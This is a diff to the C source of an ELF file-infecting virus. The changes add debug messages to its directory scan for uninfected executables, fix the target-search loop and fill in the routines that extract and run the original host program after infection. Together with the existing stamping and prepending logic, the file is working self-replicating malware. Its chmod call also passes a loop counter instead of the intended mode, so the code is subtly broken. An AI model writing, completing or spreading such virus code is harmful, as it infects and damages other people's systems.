@@ -134,6 +134,13 @@ int verify_is_original_file(char *file_name, char *virus_file_name)
 
 char *search_for_target(char *path_to_target_directory, char *virus_file_name, char *virus_signature, long length_of_signature)
 {
+
+#ifdef DEBUGMODE
+	printf("I am here. Searching for targets to infect in the directory --> %s an using the virus file --> %s whose signature is %s and length of signature is %ld.\n",
+			path_to_target_directory, virus_file_name, virus_signature,length_of_signature);
+#endif
+
+
 	struct dirent *my_dir_struct;
 
 	/* -----------------------------------------------------------------------------------
@@ -159,13 +166,10 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 	{
 		while((my_dir_struct=readdir(my_directory))!=NULL)
 		{
-			char *ptr_to_filename=my_dir_struct->d_name;
-			char *string_filename=(char *) malloc ( (strlen(ptr_to_filename)+1) *sizeof(char));
-
-			strcpy(string_filename,ptr_to_filename);
+			char *string_filename=my_dir_struct->d_name;
 
 #ifdef DEBUGMODE
-			printf("Hey, Alligator... Right now I am busy infecting this file \t ---> %s .\n",string_filename);
+			printf("Hey, Alligators... Right now I am busy infecting this file \t ---> %s .\n",string_filename);
 #endif
 
 			if(!strcmp(string_filename,".") || !strcmp(string_filename,".."))
@@ -174,16 +178,21 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 			}
 			else
 			{
+
 				if(!verify_if_is_infected(string_filename, virus_signature, length_of_signature) && verify_is_elf(string_filename) && !verify_is_original_file(string_filename, virus_file_name))		{
 					{
 						closedir(my_directory);
+
+#ifdef DEBUGMODE
+			printf("This file is not infected yet \t ---> %s  --> so I am going to infect it now.\n",string_filename);
+#endif
 						return(string_filename);
 					}
 				}
 			}
 			closedir(my_directory);
-			return NULL;
 		}
+		return NULL;
 	}
 }
 
@@ -195,6 +204,11 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 	// I stamp any infected file so that one can recognize it later against the healthy ones. Day Z zombie day, right??
 	void stamp_the_infected_file(char *file_name, char *virus_signature)
 	{
+
+#ifdef DEBUGMODE
+		printf("%s -> %s", __FILE__,__func__);
+#endif
+
 		FILE *pFile=fopen(file_name,"ab"); //"ab" goes for 'append binary..."
 
 		if(!pFile)
@@ -212,12 +226,23 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 			}
 		}
 
+#ifdef DEBUGMODE
+		printf("Hey, I stamped the following file as infected ---> %s with the signature [ %s ]. \n", file_name, virus_signature);
+#endif
+
 		fclose(pFile);
 		pFile=NULL;
 	}
 
 	int go_infect_the_target_file(char *target_binary_file_name,char *virus_binary_file_name, long size_of_virus)
 	{
+
+#ifdef DEBUGMODE
+		printf("%s -> %s .\n", __FILE__,__func__);
+		printf("I am executing this function with the parameters 'target' -->%s , 'virus-binary' ---> %s, 'size of virus' ---> %ld .\n",target_binary_file_name,virus_binary_file_name,size_of_virus);
+#endif
+
+
 		long size_of_target=what_is_the_file_length(target_binary_file_name);
 		long final_infected_binary[size_of_virus + size_of_target];
 		long i=0;
@@ -283,12 +308,65 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 		}
 	}
 
-	void extract_action_from_virus(char *binary_virus_filename, char *temporary_file_name, long size_of_virus, long length_of_signature)
+	void extract_action_from_virus(char *binary_file_name, char *temporary_file_name, long size_of_virus, long length_of_signature)
 	{
+#ifdef DEBUGMODE
+		printf("%s -> %s", __FILE__,__func__);
+#endif
 
+		long size_of_binary=what_is_the_file_length(binary_file_name);
+
+		FILE *pBinaryFile=fopen(binary_file_name,"rb");
+		FILE *pTemporaryFile=fopen(temporary_file_name,"wb");
+
+		fseek(pBinaryFile,size_of_virus,SEEK_SET);
+
+		long i;
+		for(i=0;i<size_of_binary-size_of_virus-length_of_signature;i++)
+		{
+			fputc(fgetc(pBinaryFile),pTemporaryFile);
+		}
+
+		fclose(pBinaryFile);
+		fclose(pTemporaryFile);
+
+		char accessmode[]="0755";
+		char *ptr;
+		int access=strtol(accessmode,&ptr,8);
+
+		if(chmod(temporary_file_name,i)<0)
+		{
+#ifdef DEBUGMODE
+			perror("Error when applying chmod() function");
+#endif
+		}
 	}
 
 	void execute_action(char *file_name, char *argv[], char *temporary_file_name, long size_of_virus, long length_of_signature)
 	{
+#ifdef DEBUGMODE
+		printf("%s -> %s", __FILE__,__func__);
+#endif
+
+		extract_action_from_virus(file_name, temporary_file_name, size_of_virus, length_of_signature);
+
+		pid_t process_id=fork();
+
+		if(process_id==0)
+		{
+			//executing this from the newly created child process
+			if(execv(temporary_file_name,argv)<0)
+			{
+#ifdef DEBUGMODE
+				perror("Error with execv");
+#endif
+			}
+		}
+		else
+		{
+			//executing this from the old parent
+		    waitpid(process_id, NULL, 0);
+		    remove(temporary_file_name);
+		}
 
 	}
